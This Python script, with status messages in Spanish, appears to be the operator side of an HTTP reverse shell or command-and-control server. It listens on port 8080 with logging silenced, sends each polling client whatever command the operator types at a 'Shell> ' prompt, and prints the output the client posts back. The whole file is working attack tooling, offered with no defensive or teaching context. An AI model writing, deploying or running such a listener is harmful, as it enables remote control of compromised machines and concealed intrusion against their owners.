
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
from urllib.parse import parse_qs

# IP address and port where the server will listen for connections
server_ip = "0.0.0.0"
server_port = 8080


class MyHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):

        pass

    def do_GET(self):

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(input("Shell> ").encode())

    def do_POST(self):

        content_length = int(self.headers['Content-Length'])
        data = parse_qs(self.rfile.read(content_length).decode())
        self.send_response(200)
        self.end_headers()

        if "response" in data:
            print(data["response"][0])
        else:
            print(data)


if __name__ == "__main__":

    server = HTTPServer((server_ip, server_port), MyHandler)
    print(f"Escuchando conexiones en {server_ip}:{server_port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Servidor finalizado.")
        server.server_close()